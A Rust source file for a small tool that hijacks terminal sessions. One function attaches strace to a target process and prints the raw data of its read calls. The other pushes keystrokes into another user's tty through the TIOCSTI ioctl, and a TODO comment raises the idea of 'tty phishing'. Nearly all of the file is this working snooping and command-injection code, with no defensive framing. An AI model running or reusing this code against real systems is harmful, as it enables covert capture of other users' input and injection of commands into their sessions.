use hex;
use nix::ioctl_write_int;
use nix::libc::ioctl;
use regex::Regex;
use std::io::Write;
use std::io::{self, BufRead, BufReader};
use std::os::fd::AsRawFd;
use std::process::{Command, Stdio};
use getch_rs::{Getch, Key, enable_echo_input};

/// Takes a PID, straces the process, and prints the raw contents of the read calls
pub fn read(pid: &str) {
    println!("Attaching reader to {}", pid);

    let mut child = Command::new("strace")
        .args(["-xx", "-s", "16384", "-p", pid, "-e", "read"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("Failed to start strace command");

    let stderr = child.stderr.take().expect("Failed to capture stderr");

    let mut reader = BufReader::new(stderr);
    let re = Regex::new(r#"(?mU)read\(10, "(.*)""#).unwrap();

    loop {
        let mut buf = String::new();
        let _ = reader.read_line(&mut buf);
        buf = buf.replace("\\x", "");

        if let Some(caps) = re.captures(&buf) {
            if let Some(mat) = caps.get(1) {
                let decoded_hex = hex::decode(mat.as_str()).expect("Failed to decode");
                print!(
                    "{}",
                    String::from_utf8(decoded_hex).expect("Failed to encode")
                );
                io::stdout().flush().unwrap();
            }
        }

        if let Ok(Some(_status)) = child.try_wait() {
            println!("Connection closed");
            break;
        }
    }
}

/// Takes a PID and writes to the stdin of the process
pub fn write(tty: &str, echo: bool) {
    println!("Attaching writer to {}", tty);

    let input = Getch::new();

    if echo {
        enable_echo_input();
    }

    loop {
        match input.getch() {
            Ok(Key::Ctrl('p')) => continue, // TODO: tty phishing?
            Ok(Key::Ctrl('z')) => break,
            Ok(Key::Ctrl('d')) => break,
            Ok(Key::Char(c)) => {
                write_char(tty, c);
            }
            _ => {}
        }
    }
}


fn write_char(tty: &str, c: char) {
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .open(tty)
        .expect("Failed to open tty");

    let fd = file.as_raw_fd();

    unsafe { 
        ioctl(fd, libc::TIOCSTI, &c as *const _ as *const i8);
    }
}